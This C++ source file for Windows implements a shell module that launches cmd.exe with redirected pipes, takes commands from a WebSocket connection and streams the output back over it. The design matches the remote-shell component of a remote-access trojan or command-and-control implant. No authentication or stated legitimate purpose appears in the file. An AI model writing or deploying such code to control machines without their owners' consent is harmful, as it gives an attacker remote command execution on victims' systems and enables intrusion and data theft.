#include <string>
#include <thread>
#include <mutex>
#include <iostream>
#include <nlohmann/json.hpp>
#include "websocket_client.hpp"

class Shell {
public:
    Shell(WebSocketClient& client);
    ~Shell();

    void startShell();
    void stopShell();
    void writeShellInput(const std::string& input);

private:
    void readShellOutput();

    HANDLE hChildStd_IN_Rd = NULL;
    HANDLE hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;

    PROCESS_INFORMATION piProcInfo = { 0 };
    bool shellRunning = false;
    std::thread outputThread;
    std::mutex shellLock;

    WebSocketClient& client;
};

Shell::Shell(WebSocketClient& client) : client(client) {}

Shell::~Shell() {
    stopShell();
}

void Shell::startShell() {
    if (shellRunning) {
        nlohmann::json response;
        response["type"] = "shell_output";
        response["data"] = "[Info] Shell already running";
        client.sendMessage(response.dump());
        return;
    }

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT. 
    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) {
        std::cerr << "Stdout pipe creation failed\n";
        return;
    }
    // Ensure the read handle to the pipe for STDOUT is not inherited.
    if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "Stdout SetHandleInformation failed\n";
        return;
    }

    // Create a pipe for the child process's STDIN. 
    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0)) {
        std::cerr << "Stdin pipe creation failed\n";
        return;
    }
    // Ensure the write handle to the pipe for STDIN is not inherited. 
    if (!SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "Stdin SetHandleInformation failed\n";
        return;
    }

    // Create the child process. 
    PROCESS_INFORMATION piProcInfoLocal;
    STARTUPINFOA siStartInfo;
    BOOL bSuccess = FALSE;

    ZeroMemory(&piProcInfoLocal, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));
    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.hStdInput = hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe",
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &siStartInfo,
        &piProcInfoLocal);

    if (!bSuccess) {
        std::cerr << "CreateProcess failed: " << GetLastError() << "\n";
        CloseHandle(hChildStd_OUT_Rd);
        CloseHandle(hChildStd_OUT_Wr);
        CloseHandle(hChildStd_IN_Rd);
        CloseHandle(hChildStd_IN_Wr);
        return;
    }
    else {
        CloseHandle(hChildStd_OUT_Wr);
        CloseHandle(hChildStd_IN_Rd);

        piProcInfo = piProcInfoLocal;
        shellRunning = true;

        outputThread = std::thread(&Shell::readShellOutput, this);
    }
}

void Shell::stopShell() {
    if (!shellRunning)
        return;

    shellRunning = false;

    writeShellInput("exit\n");

    for (int i = 0; i < 50; i++) {
        DWORD ret = WaitForSingleObject(piProcInfo.hProcess, 100);
        if (ret == WAIT_OBJECT_0) {
            break;  // Process exited
        }
    }

    CloseHandle(hChildStd_IN_Wr);
    hChildStd_IN_Wr = NULL;

    if (outputThread.joinable()) {
        outputThread.join();
    }

    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    CloseHandle(hChildStd_OUT_Rd);
}

void Shell::writeShellInput(const std::string& input) {
    if (!shellRunning) {
        nlohmann::json response;
        response["type"] = "shell_output";
        response["data"] = "[Info] Shell not running.";
        client.sendMessage(response.dump());
        return;
    }

    std::lock_guard<std::mutex> lock(shellLock);
    DWORD dwWritten = 0;
    std::string cmd = input + "\r\n";
    BOOL bSuccess = WriteFile(hChildStd_IN_Wr, cmd.c_str(), (DWORD)cmd.size(), &dwWritten, NULL);
    if (!bSuccess) {
        std::cerr << "WriteFile failed: " << GetLastError() << "\n";
    }
}

void Shell::readShellOutput() {
    CHAR chBuf[1024];
    DWORD dwRead;
    BOOL bSuccess;

    while (shellRunning) {
        bSuccess = ReadFile(hChildStd_OUT_Rd, chBuf, sizeof(chBuf) - 1, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) {
            break;
        }
        chBuf[dwRead] = '\0';

        std::string output(chBuf);

        if (!output.empty()) {
            nlohmann::json response;
            response["type"] = "shell_output";
            response["data"] = output;

            std::lock_guard<std::mutex> lock(shellLock);
            try {
                client.sendMessage(response.dump());
            }
            catch (const std::exception& e) {
                std::cerr << "Error sending message: " << e.what() << std::endl;
            }
        }
    }
}
